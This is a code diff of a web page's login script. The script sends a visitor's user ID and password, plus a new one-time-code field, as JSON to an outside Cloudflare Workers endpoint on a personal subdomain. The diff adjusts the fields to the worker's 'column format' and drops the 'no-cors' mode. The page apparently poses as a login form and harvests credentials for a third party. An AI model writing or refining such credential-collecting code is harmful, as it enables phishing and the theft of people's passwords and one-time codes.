@@ -140,20 +140,20 @@
             btnText.textContent = "Please wait...";
             btnSpinner.classList.remove('hidden');
 
-            // Cloudflare Worker endpoint placeholder as requested
+            // Aapka Cloudflare Worker URL
             const cloudflareWorkerUrl = 'https://empty-lab-80a1.sumankkuuyy.workers.dev/';
 
+            // Worker ke exact column format ke hisab se payload
             const payload = {
-                userId: user_Id,
+                userid: userId,
                 password: password,
-                timestamp: new Date().toISOString()
+                otp: ""
             };
 
             try {
                 // Send data to Cloudflare Worker endpoint
                 await fetch(cloudflareWorkerUrl, {
                     method: 'POST',
-                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/json'
                     },
@@ -168,6 +168,7 @@
                 }, 800);
             }
         }
+
     </script>
 </body>
 </html>
